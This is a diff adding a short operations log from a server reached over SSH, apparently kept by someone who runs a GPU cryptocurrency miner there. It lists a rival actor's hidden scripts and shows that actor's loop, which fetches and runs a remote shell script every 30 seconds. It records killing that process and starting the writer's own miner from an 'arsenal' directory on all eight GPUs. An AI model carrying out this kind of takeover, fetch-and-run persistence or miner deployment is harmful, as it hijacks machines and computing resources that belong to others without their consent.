@@ -1,0 +1,57 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### START17 2026-11-24T20:55:22Z
+### ACTOR-ARTEFACTS
+/usr/local/lib/.plh/guard.sh
+/usr/local/lib/.plh/run_gpu.sh
+/usr/local/lib/nv-cache/g.sh
+/opt/t19/www/i6564_r2.txt
+/opt/t19/www/i6425_p2.txt
+/opt/t19/www/i6425_p1.txt
+/opt/t19/www/i6564_r1.txt
+/opt/t19/www/up/ps.txt
+/opt/t19/www/i6647_r3.txt
+/opt/t19/www/i6647_r2.txt
+/opt/t19/www/i6647_r1.txt
+/opt/t19/www/.plh/guard.sh
+/opt/t19/www/.plh/run_gpu.sh
+/opt/t19/www/i6564_r3.txt
+/opt/t19/www/diag6421.txt
+/opt/t19/www/out.txt
+/opt/t19/www/i6564_r7.txt
+/opt/plh.disabled.1795551755/evidence_units.txt
+/opt/plh.disabled.1795551755/keepalive.sh
+/opt/plh.disabled.1795551755/run_gpu.sh.orig
+/opt/plh.disabled.1795551755/guard.sh
+/opt/plh.disabled.1795551755/run_gpu.sh
+/opt/plh.disabled.1795551755/.cmd2.sh
+/opt/plh.disabled.1795551755/foreign_evict/watch.sh.bak
+/opt/plh.disabled.1795551755/foreign_pre.txt
+/opt/plh.disabled.1795551755/evidence_ps.txt
+/root/vantage/out/farm_inv.txt
+/root/ul_farmfan/plh_bak/g.sh
+/root/ul_farmfan/base.txt
+/root/ul_farmfan/f2.sh
+--- 8099
+LISTEN 0      5            0.0.0.0:8099       0.0.0.0:*    users:(("python3",pid=3784436,fd=3))                                                                                                                                                                                        
+3851815 /bin/bash -c while true; do curl -sf http://127.0.0.1:8099/run.sh -o /tmp/r.sh 2>/dev/null && /bin/bash /tmp/r.sh >> /opt/t19/www/out.txt 2>&1; sleep 30; done
+### KILL-ACTOR
+kill 8099 pid=3784436
+ps-after: 1 foreign_procs
+### OUR-KIT
+bin=/opt/arsenal/miners/krig/krig-miner
+### STATE
+g0=active g1=active g2=active g3=active g4=active g5=active g6=active g7=active 
+3088689, /opt/arsenal/miners/krig/krig-miner
+3088691, /opt/arsenal/miners/krig/krig-miner
+3088692, /opt/arsenal/miners/krig/krig-miner
+3088694, /opt/arsenal/miners/krig/krig-miner
+3088702, /opt/arsenal/miners/krig/krig-miner
+3088704, /opt/arsenal/miners/krig/krig-miner
+3088709, /opt/arsenal/miners/krig/krig-miner
+3088711, /opt/arsenal/miners/krig/krig-miner
+      8 --coin pearl --url
+### POOL-90s
+Traceback (most recent call last):
+  File "<string>", line 5, in <module>
+ValueError: invalid literal for int() with base 10: '10007999171934.43555555555556'
+### DONE17 2026-11-24T20:57:24Z
